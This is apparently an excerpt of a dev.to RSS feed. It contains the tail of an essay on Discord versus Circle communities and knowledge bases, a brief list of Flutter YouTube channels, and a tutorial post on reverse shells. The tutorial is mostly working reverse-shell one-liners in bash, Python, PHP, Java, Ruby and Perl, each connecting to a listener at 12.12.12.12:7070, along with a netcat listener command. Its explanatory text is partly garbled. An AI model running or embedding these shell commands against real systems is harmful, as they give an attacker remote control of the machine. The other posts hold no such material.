&lt;li&gt;My Discord members are fewer, but more active and respond quickly to new posts. The primary means of engagement is in-app notifications, banking on the network effect of my members already being active in other Discords.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can analyze this split in every dimension and still come up 50-50. Think about the new user experience, a critical moment for every community. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A Discord user can say hi and immediately get the dopamine hit of a hi back. But they're not going to scroll up and read through the best hits of the community (pinning isn't very effective), so what they see is just completely randomly whatever is the topic of conversation that day.&lt;/li&gt;
&lt;li&gt;A Circle user doesn't even have to say hi, but can get immense value from the top/pinned post and become a fan right then. So I can pour in all my effort to make that top notch.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There's no clear cut right answer. Some users will prefer one extreme, some the other, and yet more will just want both. Yet I need to keep both up to date. What I do right now is peak do-things-that-don't-scale: I post continuous updates to Discord, and then once a week I sum up the best of what I find and &lt;a href="https://codingcareer.circle.so/c/learn-in-public"&gt;manually cross-post it to Circle&lt;/a&gt;. Sometimes I find the occasional quality post on Circle, so I send it back to Discord (for sharing with the Discord natives), and to Twitter (for marketing).&lt;/p&gt;

&lt;p&gt;So I'm paying the expensive cost of Particle/Wave Duality, because my tools currently don't recognize it. I could make a bot to do the two way sync between Discord and Circle, but what I'd really like is for this to just be built in in some way. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#database-solutions"&gt;
  &lt;/a&gt;
  Database Solutions
&lt;/h2&gt;

&lt;p&gt;If you are developer-literate, I also think there are a couple alternative analogies you can use to solve this dual need:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://en.wikipedia.org/wiki/Change_data_capture"&gt;&lt;strong&gt;Change Data Capture&lt;/strong&gt;&lt;/a&gt; (discrete → continuous): When you update a row in a database, there can be inbuilt functionality to send a notification of what changed (eg &lt;a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/kds.html"&gt;DynamoDB with Kinesis Data Streams&lt;/a&gt;). So people can read up a discrete state of information, then subscribe to the diffs. This is exactly how I use Notion at work, where I rely on email updates of diffs since it is impossible for me to stay on top of all the changes my coworkers are making by checking through each document individually.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://en.wikipedia.org/wiki/Materialized_view"&gt;Materialized Views&lt;/a&gt; (&lt;/strong&gt;continuous → discrete*&lt;em&gt;)&lt;/em&gt;*: As you add, modify, or delete data, a separate "materialized view" auto updates and can always be referenced as the source of truth on all the changes that have happened to date. This is how Kanban boards and issue trackers work, by presenting a top down view of the status of work items moving through the engineering process.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What would Change Data Capture and Materialized Views look like for knowledge management tools, say a Second Brain, or a Blog?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#applying-theory-to-creation"&gt;
  &lt;/a&gt;
  Applying Theory to Creation
&lt;/h2&gt;

&lt;p&gt;Ultimately I think a lot about this in terms of the context of writing and other forms of content creation. As much as I've been talking about the preferred content consumption angle, the stakes are even higher for content creation:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Discrete knowledge items like books and courses are most useful to learners because they present a comprehensive overview. However if it is such a big lift, it may never get done and you may be doing your learners a disservice by not contributing your voice.

&lt;ul&gt;
&lt;li&gt;By the way, many people also treat blogposts like discrete items, taking months to draft it and to have it peer-reviewed like an academic journal. This is usually unsustainable and the blogging grinds to a halt, killed by its own process.&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;li&gt;Continuous knowledge items like tweets and chat conversations are far more digestible and easier to create. However, small low effort items out of context aren't all that valuable in themselves, and struggle to stand out and get traction compared to &lt;a href="https://sparktoro.com/blog/resources/10x-content-by-rand-fishkin/"&gt;10x Content&lt;/a&gt; that sells itself.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ultimately I think you should try to do both. Prototype by making continuous knowledge items, but be aware that most people will never see your work there. So periodically you need to do "treasure collection" - go back through your continuous streams, and pick out the most promising threads to turn into bigger, discrete pieces.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#question-from-a-reader"&gt;
  &lt;/a&gt;
  Question from a Reader
&lt;/h2&gt;

&lt;p&gt;"&lt;em&gt;Our team currently has years of docs in a Google docs like system. Main problem with new hires is that they haven't yet accepted that the docs are poorly maintained, or there are 6 docs for the same process written by different people and not deleted or updated. It's madness. How would you go about this process?&lt;/em&gt;"&lt;/p&gt;

&lt;p&gt;Ah, the outdated knowledge base problem. We continually swing back and forth between wanting a discrete source of truth, but then time passes and continuous updates do not get registered. Technology hasn't (yet) solved this — although graph database tooling like &lt;a href="https://roamresearch.com/"&gt;Roam Research&lt;/a&gt; or &lt;a href="https://obsidian.md/"&gt;Obsidian&lt;/a&gt; can automatically propagate continuous updates to discrete materialized views, it is still a poor susbstitute for properly curated and updated structure. &lt;/p&gt;

&lt;p&gt;Ultimately I view the knowledge base problem as a human problem - you have to commit to maintaining your sources of truth, but don't make it so huge as to be unmaintainable and unreadable. Don't be so rigid about your process that you treat people talking to each other to figure out problems as a bug. Identify what you care about and make it a priority to enforce that, but recognize that enforcement isn't free and pick your battles.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Major thanks to &lt;a href="https://xdg.me/"&gt;David Golden&lt;/a&gt;, &lt;a href="https://twitter.com/_mjmeyer?lang=en"&gt;MJ Meyer&lt;/a&gt;, and &lt;a href="https://calvintorra.com/"&gt;Calvin Torra&lt;/a&gt; for providing feedback on drafts!&lt;/em&gt;&lt;/p&gt;

</description>
      <category>learning</category>
      <category>reflections</category>
    </item>
    <item>
      <title>[Cybersecurity] How do Reverse shells work?</title>
      <author>Yuma-Tsushima </author>
      <pubDate>Fri, 25 Jun 2021 20:24:24 +0000</pubDate>
      <link>https://dev.to/yumatsushima07/cybersecurity-how-do-reverse-shells-work-1jfc</link>
      <guid>https://dev.to/yumatsushima07/cybersecurity-how-do-reverse-shells-work-1jfc</guid>
      <description>&lt;h1&gt;
  &lt;a href="#reverse-shells"&gt;
  &lt;/a&gt;
  Reverse Shells
&lt;/h1&gt;

&lt;h2&gt;
  &lt;a href="#how-do-reverse-shells-work"&gt;
  &lt;/a&gt;
  How do reverse shells work?
&lt;/h2&gt;

&lt;p&gt;To make a connection to a typical remote shell, a machine controlled by the attacker connects to the remote network host and it requests a shell connection.&lt;br&gt;
This is called a &lt;code&gt;blind shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;But what if the remote host is not directly accessible, like it has public IP or is protected by a firewall?&lt;/p&gt;

&lt;p&gt;In this situation reverse shells maybe shouldn't be used, where the target machine initiates connection to the listening network host a shell is now established.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#reverse-shells-examples"&gt;
  &lt;/a&gt;
  Reverse Shells Examples
&lt;/h2&gt;

&lt;p&gt;To start you need a listener process on their system to listen the reverse shell connections incoming to their IP address, Eg, &lt;code&gt;12.12.12.12&lt;/code&gt;&lt;br&gt;
On Linux, this can be as simple as one netcat command.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;nc -lvnp 7070
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;The netcat listener will listen at port &lt;code&gt;7070&lt;/code&gt;. An attacker needs to execute the code to the listener. Many reverse shells needs programming langs&lt;br&gt;
and systems. &lt;br&gt;
Check out &lt;a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentestmonkey’s Reverse Shell Cheat Sheet&lt;/a&gt; for more.&lt;br&gt;
Codes are typically one-liners to allow injection using a single command. &lt;br&gt;
While the examples below are for Linux and other Unix-like systems, many of them will also work on Windows if you change the command line interpreter call from &lt;code&gt;/bin/sh -i&lt;/code&gt; to &lt;code&gt;cmd.exe&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#bash-reverse-shell"&gt;
  &lt;/a&gt;
  Bash Reverse Shell
&lt;/h3&gt;

&lt;p&gt;If the target machine runs Linux, it’s a good idea to start with bash, as nearly all Linux systems come with this system shell:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;/bin/bash &lt;span class="nt"&gt;-i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/12.12.12.12/7070 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#python-reverse-shell"&gt;
  &lt;/a&gt;
  Python Reverse Shell
&lt;/h3&gt;

&lt;p&gt;With Python continuing to gain popularity, there’s a good chance it’s available on the target server and can be used to execute a script like:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("12.12.12.12",7070));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#php-reverse-shell"&gt;
  &lt;/a&gt;
  PHP Reverse Shell
&lt;/h3&gt;

&lt;p&gt;Most web servers will have PHP installed, and this too can provide a reverse shell vector (if the file descriptor &amp;amp;3 doesn’t work, you can try subsequent numbers):&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="n"&gt;php&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="s1"&gt;'$sock=fsockopen("12.12.12.12",7070);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#java-reverse-shell"&gt;
  &lt;/a&gt;
  Java Reverse Shell
&lt;/h3&gt;

&lt;p&gt;Java is likely to be available on application servers:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Runtime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;([&lt;/span&gt;&lt;span class="s"&gt;"/bin/bash"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="s"&gt;"-c"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="s"&gt;"exec 5&amp;lt;&amp;gt;/dev/tcp/12.12.12.12/7070;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done"&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;waitFor&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#ruby-reverse-shell"&gt;
  &lt;/a&gt;
  Ruby Reverse Shell
&lt;/h3&gt;

&lt;p&gt;Ruby is another popular web application language that’s likely to have an interpreter on a general-purpose server system:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("12.12.12.12",7070).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#perl-reverse-shell"&gt;
  &lt;/a&gt;
  Perl Reverse Shell
&lt;/h3&gt;

&lt;p&gt;As with bash, a perl interpreter should be available on most Linux servers, so a perl command might be another way to obtain a reverse shell:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight perl"&gt;&lt;code&gt;&lt;span class="nv"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;e&lt;/span&gt; &lt;span class="p"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;use Socket;$i="12.12.12.12";$p=7070;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h2&gt;
  &lt;a href="#check-out-my-gist-here"&gt;
  &lt;/a&gt;
  Check out my Gist Here
&lt;/h2&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#credits"&gt;
  &lt;/a&gt;
  Credits
&lt;/h2&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt; / &lt;a href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Readme file
    &lt;/h3&gt;
  &lt;/div&gt;
  &lt;div class="ltag-github-body"&gt;
    
&lt;div id="readme" class="md"&gt;
      &lt;h1&gt;
Welcome to Yuma-Tsushima's Github page!&lt;/h1&gt;
  &lt;p&gt;
  &lt;b&gt;Visitor count &lt;/b&gt;&lt;br&gt;
  &lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;img src="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.patreon.com/Order_of_the_Black_Knights_C2_bot" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/6a6769e2d2eb0567975317a589549beaa5db99df73ce9d6f5f9004ec12eee28e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f537570706f72742d42757925323075732532306125323050697a7a612d6f72616e67652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d70617472656f6e" alt="Support"&gt;&lt;/a&gt;
&lt;a href="https://disboard.org/server/711260885531885648" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/018986f113096a2680c8fa03f313cdf0b8adf24be6d7b9df04b81f14e7897680/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f43322773253230506c6163652d4a6f696e2532307573253230666f7225323061253230636861742d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b3b2ffae6fa2d5de61341af99a4e69ce1546047acebcb5039aa106a8411b2209/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a6f696e253230746f253230636861742d4379626572417274427974652d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b8ae02d15a55c4261d919a7dd81f80335cf71d017eb6b737cc32698877f322f9/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f536f756e642d436c6f75642d7265642e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d736f756e64636c6f7564" alt="SoundCloud"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/blob/main/assets/terminalpython.png"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--30kNr2f4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/raw/main/assets/terminalpython.png"&gt;&lt;/a&gt;&lt;/p&gt;

      &lt;h3&gt;
About Myself&lt;/h3&gt;
      &lt;p&gt;Hello, my name is Yuma-Tsushima (frequently shortened to Yuma). I am an ambitious coder, and I enjoy coding in JavaScript (mainly). I also love making websites using HTML, CSS and (of course) JS! I started programming (self taught) at the age of 13. Originally, I came from the creative field ; I draw/sing/animate/make music.  &lt;/p&gt;
   

&lt;h3&gt;
Talents and Hobbies&lt;/h3&gt;
&lt;p&gt;I love drawing (I have been drawing all of my life). I play strategy games, I code and I do CTFs! I am also good at animation, making AMVs and image editing. My favourite game is Mindustry, followed by Flow Free and Sudoku. I love watching anime (I love Code Geass - I relate to Lelouch a lot) and I aspire to create my own anime!&lt;/p&gt;
&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a"&gt;&lt;img src="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a" alt="Drawing"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042"&gt;&lt;img src="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042" alt="Music"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025" alt="Digital Artwork"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041" alt="ICT"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041" alt="Electronics"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525"&gt;&lt;img src="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525" alt="Desgins"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025" alt="Web dev"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525"&gt;&lt;img src="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525" alt="Strategy"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt; Check out my work!: &lt;/b&gt; &lt;br&gt;
❯ Soundcloud : &lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;0c7av3h4ck5&lt;/a&gt; &lt;br&gt;
❯ Discord : &lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;{CyberArtByte}&lt;/a&gt;  &lt;br&gt;
❯ Artwork : &lt;a href="https://medibang.com/u/AcceleratorArts07/" rel="nofollow"&gt;AcceleratorArts07&lt;/a&gt; &lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Recent Medium&lt;/b&gt;…&lt;/p&gt;
&lt;/div&gt;
  &lt;/div&gt;
  &lt;div class="gh-btn-container"&gt;&lt;a class="gh-btn" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;View on GitHub&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;


&lt;h3&gt;
  &lt;a href="#follow-me"&gt;
  &lt;/a&gt;
  Follow me!
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Github: &lt;a href="https://github.com/Yuma-Tsushima07"&gt;https://github.com/Yuma-Tsushima07&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Medium: &lt;a href="https://0xv37r1x3r.medium.com/"&gt;https://0xv37r1x3r.medium.com/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;SoundCloud: &lt;a href="https://soundcloud.com/0c7av3h4ck5"&gt;https://soundcloud.com/0c7av3h4ck5&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#discord-servers"&gt;
  &lt;/a&gt;
  Discord Servers!!
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Bounty Hunters&lt;/strong&gt;: An amazing bug hunting community full of developers and exploiters!!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.gg/J5PsgKqdWq"&gt;https://discord.gg/J5PsgKqdWq&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;CyberArtByte&lt;/strong&gt;: My server full of bling and joy!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.com/invite/mNAWykv67W"&gt;https://discord.com/invite/mNAWykv67W&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#new-soundcloud-track"&gt;
  &lt;/a&gt;
  New Soundcloud Track!!
&lt;/h3&gt;

&lt;p&gt;&lt;iframe width="100%" height="166" src="https://w.soundcloud.com/player/?url=https://soundcloud.com/0c7av3h4ck5/hack-with-your-heart-0c7av3h4ck5&amp;amp;auto_play=false&amp;amp;color=%23000000&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&amp;amp;show_teaser=true"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Author: Yuma-Tsushima07&lt;/p&gt;

</description>
      <category>security</category>
      <category>programming</category>
      <category>python</category>
      <category>java</category>
    </item>
    <item>
      <title>Best Youtube Channels to learn Flutter [2021]</title>
      <author>Anonymous Programmer</author>
      <pubDate>Fri, 25 Jun 2021 20:16:00 +0000</pubDate>
      <link>https://dev.to/anonymousprogrammer/best-youtube-channels-to-learn-flutter-2021-48bd</link>
      <guid>https://dev.to/anonymousprogrammer/best-youtube-channels-to-learn-flutter-2021-48bd</guid>
      <description>&lt;p&gt;Hey What's Up?&lt;br&gt;
In this article we are gonna talk about best Youtube Channels to learn Flutter. Obviously We would be starting from flutter's official youtube channel, &lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;FLUTTER &lt;/li&gt;
&lt;li&gt;RetroPortal Studio&lt;/li&gt;
&lt;li&gt;MTECH Viral&lt;/li&gt;
&lt;li&gt;TVAC Studio&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I know I missed many out, So please share in the comments, But Personally these are the only channels I learn nd implement flutter from...&lt;/p&gt;

&lt;p&gt;Bye See you in the other one!&lt;/p&gt;

</description>
      <category>flutter</category>
      <category>fluttter2021</category>
      <category>bestyoutubechannel</category>
      <category>learning</category>
    </item>
    <item>
      <title>Why is learning Kubernetes so Intimidating?</title>
      <author>Austin King (he/him)</author>
      <pubDate>Fri, 25 Jun 2021 20:14:37 +0000</pubDate>
